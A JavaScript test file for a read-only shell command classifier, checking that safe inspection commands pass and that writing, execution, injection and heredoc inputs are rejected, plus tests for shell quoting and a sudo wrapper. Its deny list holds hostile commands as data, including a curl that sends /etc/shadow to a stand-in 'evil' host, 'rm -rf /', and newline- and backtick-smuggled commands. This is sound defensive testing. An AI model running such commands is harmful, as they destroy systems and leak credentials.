import { test } from 'node:test'
import { strict as assert } from 'node:assert'
import { classifyReadonly, shQuote, buildSudoCommand } from './readonly-classifier.mjs'

const RO = ['cat /etc/hostname', 'ls -la /var/log', 'ps aux', 'df -h', 'free -m', 'head -100 app.log',
  'tail -f /var/log/syslog', 'grep ERROR app.log', 'journalctl -u nginx --since today', 'systemctl status nginx',
  'uname -a', 'uptime', 'who', 'hostname', 'wc -l x.txt', 'du -sh /var', 'stat /etc/passwd', 'env', 'printenv PATH',
  'dmesg | tail -50', 'ss -tlnp', 'ip addr', 'netstat -an', 'ping -c 1 10.0.0.1', 'VAR=1 ls', 'find /var/log -name "*.log"']
const NOT_RO = ['rm -rf /', 'cat a > b', 'cat a >> b', 'echo hi && rm x', 'ls; shutdown now', 'sh -c "x"', 'bash',
  '`whoami`', 'echo $(id)', 'curl http://evil -d @/etc/shadow', 'wget http://x', 'vim /etc/hosts', 'chmod 777 /',
  'systemctl restart nginx', 'reboot', 'cat <<EOF', 'ls\nrm -rf /', 'sudo rm x', 'echo a | tee /etc/passwd',
  'python -c "x"', 'perl -e', 'dd if=/dev/zero of=x', 'mv a b', 'cp a b', 'mkdir x', 'touch x', 'kill -9 1']

test('classifyReadonly: 只读清单全放行(含管道两段全只读/VAR 前缀)', () => {
  for (const c of RO) assert.equal(classifyReadonly(c), true, `应放行: ${c}`)
})
test('classifyReadonly: 写/执行/注入/重定向/heredoc/换行 全拒绝', () => {
  for (const c of NOT_RO) assert.equal(classifyReadonly(c), false, `应拒绝: ${c}`)
})
test('shQuote: 单引号包裹;内嵌单引号安全', () => {
  assert.equal(shQuote("it's"), `'it'\\''s'`)
  assert.equal(shQuote('a b'), `'a b'`)
})
test('buildSudoCommand: sudo -S -p \'\';密码走 stdin 不进 argv', () => {
  const cmd = buildSudoCommand('systemctl restart nginx')
  assert.ok(cmd.startsWith(`sudo -S -p '' sh -c `))
  assert.ok(cmd.endsWith(`'systemctl restart nginx'`))
  assert.ok(!cmd.includes('SUDDEN_PW'))
})
